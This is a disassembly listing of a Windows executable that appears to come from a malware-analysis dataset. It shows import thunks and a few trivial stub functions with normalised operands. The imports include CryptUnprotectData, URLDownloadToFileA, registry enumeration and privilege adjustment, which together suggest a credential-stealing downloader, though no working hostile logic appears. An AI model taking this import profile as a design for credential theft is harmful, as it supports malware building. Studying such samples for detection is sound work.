jmp [ SetErrorMode@IAT ]
SetPriorityClass
jmp [ SetPriorityClass@IAT ]
OutputDebugStringA
jmp [ OutputDebugStringA@IAT ]
GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
MoveFileA
jmp [ MoveFileA@IAT ]
CompareStringA
jmp [ CompareStringA@IAT ]
lstrcmpiA
jmp [ lstrcmpiA@IAT ]
CompareStringW
jmp [ CompareStringW@IAT ]
GetProcessTimes
jmp [ GetProcessTimes@IAT ]
EnumDisplaySettingsA
jmp [ EnumDisplaySettingsA@IAT ]
GetSystemMetrics
jmp [ GetSystemMetrics@IAT ]
GetKeyboardLayoutNameA
jmp [ GetKeyboardLayoutNameA@IAT ]
wsprintfA
jmp [ wsprintfA@IAT ]
ShowWindow
jmp [ ShowWindow@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
LockSetForegroundWindow
jmp [ LockSetForegroundWindow@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
wvsprintfA
jmp [ wvsprintfA@IAT ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharUpperBuffA
jmp [ CharUpperBuffA@IAT ]
GetUserNameA
jmp [ GetUserNameA@IAT ]
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
RegEnumKeyA
jmp [ RegEnumKeyA@IAT ]
RegOpenKeyA
jmp [ RegOpenKeyA@IAT ]
RegEnumKeyExA
jmp [ RegEnumKeyExA@IAT ]
RegQueryInfoKeyA
jmp [ RegQueryInfoKeyA@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegEnumValueA
jmp [ RegEnumValueA@IAT ]
RegQueryValueExW
jmp [ RegQueryValueExW@IAT ]
RegEnumValueW
jmp [ RegEnumValueW@IAT ]
CryptReleaseContext
jmp [ CryptReleaseContext@IAT ]
CryptDestroyHash
jmp [ CryptDestroyHash@IAT ]
CryptDestroyKey
jmp [ CryptDestroyKey@IAT ]
CryptDecrypt
jmp [ CryptDecrypt@IAT ]
CryptDeriveKey
jmp [ CryptDeriveKey@IAT ]
CryptHashData
jmp [ CryptHashData@IAT ]
CryptCreateHash
jmp [ CryptCreateHash@IAT ]
CryptAcquireContextA
jmp [ CryptAcquireContextA@IAT ]
OpenProcessToken
jmp [ OpenProcessToken@IAT ]
RegSetValueExA
jmp [ RegSetValueExA@IAT ]
RegCreateKeyA
jmp [ RegCreateKeyA@IAT ]
RegDeleteValueA
jmp [ RegDeleteValueA@IAT ]
AdjustTokenPrivileges
jmp [ AdjustTokenPrivileges@IAT ]
LookupPrivilegeValueA
jmp [ LookupPrivilegeValueA@IAT ]
CryptGenRandom
jmp [ CryptGenRandom@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
SafeArrayPutElement
jmp [ SafeArrayPutElement@IAT ]
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SysAllocString
jmp [ SysAllocString@IAT ]
VariantInit
jmp [ VariantInit@IAT ]
IsUserAnAdmin
jmp [ IsUserAnAdmin@IAT ]
SHGetFolderPathA
jmp [ SHGetFolderPathA@IAT ]
SHGetSpecialFolderPathA
jmp [ SHGetSpecialFolderPathA@IAT ]
CoTaskMemFree
jmp [ CoTaskMemFree@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
OleInitialize
jmp [ OleInitialize@IAT ]
GetModuleFileNameExA
jmp [ GetModuleFileNameExA@IAT ]
EnumProcesses
jmp [ EnumProcesses@IAT ]
StrStrIA
jmp [ StrStrIA@IAT ]
CryptUnprotectData
jmp [ CryptUnprotectData@IAT ]
GetNetworkParams
jmp [ GetNetworkParams@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
gethostname
jmp [ gethostname@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
sub_412c66
mov ecx rw-data
call sub_40f5f9
and [ rw-data ] 0x0
push sub_412ceb
call sub_410891
pop ecx
retn
sub_412c83
push ebp
mov ebp esp
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov [ rw-data ] 0x0
and [ rw-data ] 0x0
push sub_412d00
call sub_410891
pop ecx
pop ebp
retn
sub_412cb2
push ebp
mov ebp esp
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov [ rw-data ] 0x0
and [ rw-data ] 0x0
push r-xdata
call sub_410891
pop ecx
pop ebp
retn
sub_412ce1
mov ecx rw-data
jmp sub_40f609
sub_412ceb
push esi
mov esi rw-data
mov ecx esi
call sub_4023b8
mov ecx esi
pop esi
jmp sub_40f609
sub_412d00
push ebp
mov ebp esp
sub esp 0x10
mov ecx rw-data
call sub_40f34c
leave
retn
